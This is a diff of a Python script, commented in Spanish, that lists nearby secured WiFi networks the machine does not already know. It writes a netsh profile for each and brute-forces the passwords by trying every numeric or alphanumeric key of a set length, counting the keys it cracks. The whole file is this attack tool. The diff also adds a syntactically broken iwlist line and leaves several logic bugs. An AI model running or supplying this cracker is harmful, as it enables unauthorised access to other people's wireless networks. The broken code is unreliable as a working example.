@@ -1,59 +1,66 @@
+import os
+import re
+import subprocess
+
+import numpy as np
+import pandas as pd
 from tqdm import tqdm
-import os, re, subprocess, pandas as pd, numpy as np
 
 
-def Find_SSID(dim):
-    # ver redes detectables y caracteristicas
+def find_ssid(dim):
+    # list networks
     wifi_info = str(
         subprocess.run(["netsh", "wlan", "show", "networks"], capture_output=True)
+
+    subprocess.run(["sudo", "iwlist", "wlp3s0", "scan", "\|", "grep", "ESSID"], capture_output=True)
     )
     wifi_prev = str(
         subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True)
     )
 
     # Analizadores de texto
-    Rex_ssid = re.compile(r"SSID [\d]+ : ([\w \d \s \- \.]*)")
-    Rex_se = re.compile(r"Autenticaci\\xa2n           : ([\w \d \s \- \.]*)")
-    Rex_prev = re.compile(r"Perfil de todos los usuarios     : ([\w \d \s \- \.]*)")
+    rex_ssid = re.compile(r"SSID [\d]+ : ([\w \d \s \- \.]*)")
+    rex_se = re.compile(r"Autenticaci\\xa2n           : ([\w \d \s \- \.]*)")
+    rex_prev = re.compile(r"Perfil de todos los usuarios     : ([\w \d \s \- \.]*)")
 
-    # hacer DB de las redes y tipo
-    SSID = Rex_ssid.findall(wifi_info)
-    tipo = Rex_se.findall(wifi_info)
-    conocidas = Rex_prev.findall(wifi_prev)
-    redes = pd.DataFrame(
-        {"Redes": SSID, "Seguridad": tipo, "last": np.zeros(len(SSID))}
+    # hacer DB de las networks y tipo
+    ssid = rex_ssid.findall(wifi_info)
+    tipo = rex_se.findall(wifi_info)
+    known = rex_prev.findall(wifi_prev)
+    networks = pd.DataFrame(
+        {"Redes": ssid, "Seguridad": tipo, "last": np.zeros(len(ssid))}
     )
 
-    # depurar redes compatibles
-    indexN = redes[redes["Seguridad"] == "Abierta"].index
-    redes.drop(indexN, inplace=True)
-    indexN = redes[redes["Redes"] == ""].index
-    redes.drop(indexN, inplace=True)
-    for i in range(len(conocidas)):
-        indexN = redes[redes["Redes"] == conocidas[i]].index
-        redes.drop(indexN, inplace=True)
-    redes.reset_index(drop=True, inplace=True)
+    # depurar networks compatibles
+    indexN = networks[networks["Seguridad"] == "Abierta"].index
+    networks.drop(indexN, inplace=True)
+    indexN = networks[networks["Redes"] == ""].index
+    networks.drop(indexN, inplace=True)
+    for i in range(len(known)):
+        indexN = networks[networks["Redes"] == known[i]].index
+        networks.drop(indexN, inplace=True)
+    networks.reset_index(drop=True, inplace=True)
     # Cambiar el nombre de seguridad a su valor equivalente #
-    redes.Seguridad = redes.Seguridad.replace(
+    networks.Seguridad = networks.Seguridad.replace(
         ["WPA2-Personal", "WPA-Personal"], ["WPA2PSK", "WPAPSK"]
     )
     # cargar columna de ultimo valor probado #
 
-    ## cargar formato xml para las redes disponibles ##
+    ## cargar formato xml para las networks disponibles ##
     xml = open(".\\Sample.xml").readlines()
-    for i in range(len(redes.Redes)):
-        if os.path.exists(".\\temp\\" + redes.Redes[i] + ".xml") == False:
-            xml[2] = "\t<name>" + redes.Redes[i] + "</name>\n"
-            xml[5] = "\t\t\t<hex>" + (redes.Redes[i].encode("utf-8")).hex() + "</hex>\n"
-            xml[6] = "\t\t\t<name>" + redes.Redes[i] + "</name>\n"
+    for i in range(len(networks.Redes)):
+        if os.path.exists(".\\temp\\" + networks.Redes[i] + ".xml") == False:
+            xml[2] = "\t<name>" + networks.Redes[i] + "</name>\n"
+            xml[5] = "\t\t\t<hex>" + (networks.Redes[i].encode("utf-8")).hex() + "</hex>\n"
+            xml[6] = "\t\t\t<name>" + networks.Redes[i] + "</name>\n"
             xml[14] = (
-                "\t\t\t\t<authentication>" + redes.Seguridad[i] + "</authentication>\n"
+                    "\t\t\t\t<authentication>" + networks.Seguridad[i] + "</authentication>\n"
             )
-            if redes.Seguridad[i] == "WPA2PSK":
+            if networks.Seguridad[i] == "WPA2PSK":
                 xml[15] = "\t\t\t\t<encryption>AES</encryption>\n"
-            elif redes.Seguridad[i] == "WPAPSK":
+            elif networks.Seguridad[i] == "WPAPSK":
                 xml[15] = "\t\t\t\t<encryption>AES</encryption>\n"
-            temp = open(".\\temp\\" + redes.Redes[i] + ".xml", "w")
+            temp = open(".\\temp\\" + networks.Redes[i] + ".xml", "w")
             temp.write("".join(xml))
             temp.close()
         else:  ##PROBAR si puedo generar una columna de boolenaos ##
@@ -64,9 +71,9 @@ def Find_SSID(dim):
             # verificar que sean de igual dimension si no descartar cambio
             if last != None:
                 if len(last[0]) == dim:
-                    redes.last[i] == last[0]
+                    networks.last[i] == last[0]
 
-    return redes
+    return networks
 
 
 # incrementador de cadenas
@@ -102,10 +109,10 @@ def key_test(pw, red):
     connection = str(
         subprocess.run(["netsh", "wlan", "connect", "name=" + red], capture_output=True)
     )
-    Rex_connect = re.compile(
+    rex_connect = re.compile(
         r"(La solicitud de conexi\\xa2n se complet\\xa2 correctamente\.)"
     )
-    cover = Rex_connect.search(connection)
+    cover = rex_connect.search(connection)
     if cover != None:
         # informacion de conexion
         interface = str(
@@ -125,26 +132,26 @@ def key_test(pw, red):
         return None
 
 
-def numeric(redes, last, dim):
+def numeric(networks, last, dim):
     keys = 0
     for i in tqdm(range(last)):
         pw = "0" * (dim - (len(str(i)))) + str(i)
-        # probar en redes
-        for k in range(len(redes.Redes)):
-            signal = key_test(pw, redes.Redes[k])
-            if signal == True:
-                redes.drop(k, inplace=True)
-                redes.reset_index(drop=True, inplace=True)
+        # probar en networks
+        for k in range(len(networks.Redes)):
+            signal = key_test(pw, networks.Redes[k])
+            if signal:
+                networks.drop(k, inplace=True)
+                networks.reset_index(drop=True, inplace=True)
                 print("\nSe ha conseguido una key c:\n")
                 keys = +1
 
-    for n in range(redes.Redes):
-        subprocess.run(["netsh", "wlan", "delete", "profile name=" + redes.Redes[n]])
+    for n in range(networks.Redes):
+        subprocess.run(["netsh", "wlan", "delete", "profile name=" + networks.Redes[n]])
 
     return keys
 
 
-def alfanum(redes, dim, ntries):
+def alfa_num(networks, dim, ntries):
     import string
 
     # condicion de alfanumerico o con caracteres especiales
@@ -159,54 +166,54 @@ def alfanum(redes, dim, ntries):
     for i in range(dim):
         pws.append("0")
     inc = True
-    while inc == True and len(redes.Redes) > 0:
+    while inc == True and len(networks.Redes) > 0:
         keys = 0
         for i in range(len(caracts)):
             pws[-1] = caracts[i]
             pw = "".join(pws)
             ## Enviar a la funcion de test ##
-            for k in range(len(redes.Redes)):
+            for k in range(len(networks.Redes)):
                 ## conseguir como evaluar las cadenas inferiores a otras para descartar repetidos ##
-                if redes.last[i] == pw:
-                    redes.last[i] == True
-                signal = key_test(pw, redes.Redes[k])
-                if signal == True:
-                    redes.drop(k, inplace=True)
-                    redes.reset_index(drop=True, inplace=True)
+                if networks.last[i] == pw:
+                    networks.last[i]
+                signal = key_test(pw, networks.Redes[k])
+                if signal:
+                    networks.drop(k, inplace=True)
+                    networks.reset_index(drop=True, inplace=True)
                     keys = +1
         pws, inc = incress(pws, caracts)
-    for n in range(len(redes.Redes)):
-        subprocess.run(["netsh", "wlan", "delete", "profile name=" + redes.Redes[n]])
+    for n in range(len(networks.Redes)):
+        subprocess.run(["netsh", "wlan", "delete", "profile name=" + networks.Redes[n]])
     return f"test de tipo: {t} y de cadenas de: {str(dim)} fue completado", keys
 
 
 ## primeros test funcionaron pero la iteracion tiene mucho coste computacional ##
 while True:
     try:
-        dim = int(input("Dimension de la clave a probar"))
-    except:
-        print("no es un valor numerico")
+        dim = int(input("digits to try"))
+    except ValueError:
+        print("setting default value = 8")
 
-    # dimension de la clave a probar
-    type = input("tipo de cadena (num/alfaNum/alfaEspecial)")
-    # Ver redes e iniciar los archivos xml
-    redes = Find_SSID(dim)
+    # password length
+    test_type = input("tipo de cadena (num/alfaNum/alfaEspecial)")
+    # list networks
+    networks = find_ssid(dim)
     last = int("1" + "0" * dim)
 
-    # numericas
-    if type == "num":
-        keys = numeric(redes, last, dim)
+    # numeric
+    if test_type == "num":
+        keys = numeric(networks, last, dim)
         break
-    # alfanumericas
-    elif type == "alfaNum":
-        log, keys = alfanum(redes, dim, 0)
+    # alfa-numeric
+    elif test_type == "alfaNum":
+        log, keys = alfa_num(networks, dim, 0)
         break
-    # alfanumericas con caracteres especiales
-    elif type == "alfaEspecial":
-        log, keys = alfanum(redes, dim, 1)
+    # alfa-numeric with special characters
+    elif test_type == "alfaEspecial":
+        log, keys = alfa_num(networks, dim, 1)
         break
     else:
-        print("No has introducido un tipo valido")
+        print("no valid value")
 
 print(log)
 print(f"keys encontradas: {keys}")
